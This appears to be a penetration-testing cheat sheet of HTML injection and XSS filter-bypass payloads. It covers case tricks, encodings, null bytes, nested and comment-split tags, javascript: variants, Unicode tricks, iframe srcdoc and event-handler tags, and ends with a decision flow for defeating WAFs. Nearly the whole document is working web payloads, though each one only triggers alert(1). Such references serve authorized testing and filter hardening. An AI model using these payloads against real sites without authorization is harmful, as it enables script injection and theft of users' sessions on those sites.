# HTML Injection — WAF & Filter Bypass Techniques

Use these when basic payloads are blocked by WAFs or input sanitization.

---

## 1. Case Variation

```html
<B>test</B>
<H1>test</H1>
<IMG SRC=x onerror=alert(1)>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
<ImG sRc=x oNeRrOr=alert(1)>
```

---

## 2. Extra Whitespace & Newlines

```html
<img  src=x  onerror=alert(1)>

<img
src=x
onerror=alert(1)>

< img src=x onerror=alert(1)>
```

---

## 3. Slash Between Tag and Attribute

```html
<img/src=x onerror=alert(1)>
<img/onerror=alert(1) src=x>
<b/onmouseover=alert(1)>test</b>
```

---

## 4. Null Bytes

```html
<i%00mg src=x onerror=alert(1)>
<scr%00ipt>alert(1)</scr%00ipt>
<img \x00src=x onerror=alert(1)>
```

---

## 5. HTML Entity Encoding

```html
<!-- alert(1) encoded as decimal entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex entities -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

<!-- Mixed -->
<img src=x onerror=&#97;lert(1)>
```

---

## 6. URL Encoding

```
Single encoding:
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

Double encoding:
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

%3Ch1%3Etest%3C%2Fh1%3E
```

---

## 7. Nested/Malformed Tags
*When filter strips tags once but doesn't loop*

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<b<b>test</b</b>>
<img <img src=x onerror=alert(1)>
<<script>alert(1)//<</script>
```

---

## 8. HTML Comments Inside Tags

```html
<s<!---->cript>alert(1)</s<!---->cript>
<img s<!---->rc=x onerror=alert(1)>
<scr<!---->ipt>alert(1)</scr<!---->ipt>
```

---

## 9. Alternative Attribute Quotes

```html
<!-- Single quotes -->
<img src='x' onerror='alert(1)'>

<!-- No quotes -->
<img src=x onerror=alert(1)>

<!-- Backticks (some older browsers) -->
<img src=`x` onerror=`alert(1)`>
```

---

## 10. Tab and Special Whitespace Characters

```html
<!-- Tab (0x09) -->
<img	src=x	onerror=alert(1)>

<!-- URL encoded special chars -->
<img%09src=x%09onerror=alert(1)>   <!-- tab -->
<img%0Asrc=x%0Aonerror=alert(1)>   <!-- newline -->
<img%0Dsrc=x%0Donerror=alert(1)>   <!-- carriage return -->
<img%0Csrc=x%0Conerror=alert(1)>   <!-- form feed -->
```

---

## 11. JavaScript Protocol Variations

```html
<a href="javascript:alert(1)">click</a>
<a href="JaVaScRiPt:alert(1)">click</a>
<a href="java&#9;script:alert(1)">click</a>    <!-- tab -->
<a href="java&#10;script:alert(1)">click</a>   <!-- newline -->
<a href="java&#13;script:alert(1)">click</a>   <!-- carriage return -->
<a href="&#106;avascript:alert(1)">click</a>   <!-- j encoded -->
```

---

## 12. Unicode & Charset Tricks

```html
<!-- Unicode fullwidth angle brackets -->
＜script＞alert(1)＜/script＞

<!-- Soft hyphen (invisible character) -->
<s­cript>alert(1)</s­cript>

<!-- Zero width space -->
<scri​pt>alert(1)</scri​pt>
```

---

## 13. srcdoc Bypass (iframe)

```html
<!-- When src is filtered but srcdoc is not -->
<iframe srcdoc="<h1>Injected</h1>"></iframe>
<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
<iframe srcdoc="&#60;img src=x onerror=alert(1)&#62;"></iframe>
```

---

## 14. Alternative Tags When Script/Img Are Blocked

```html
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<object data="javascript:alert(1)">
```

---

## Decision Flow

```
Payload blocked?
│
├── 1. Try case variation          <IMG>, <H1>, <sCrIpT>
├── 2. Try alternative tags        <svg>, <details>, <video>
├── 3. Remove quotes               <img src=x onerror=alert(1)>
├── 4. Add whitespace/tabs         <img  src=x  onerror=...>
├── 5. URL encode                  %3Cimg%20...%3E
├── 6. HTML entity encode          &#60;img...&#62;
├── 7. Try nested tags             <scr<script>ipt>
├── 8. Try HTML comments           <s<!---->cript>
└── 9. Try null bytes              <scr%00ipt>
```

---

## Tools for Fuzzing Bypasses

- **Burp Suite Intruder** — load a payload wordlist and fuzz all variations automatically
- **PayloadsAllTheThings** — https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks** — https://book.hacktricks.xyz
- **XSS Cheat Sheet (PortSwigger)** — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
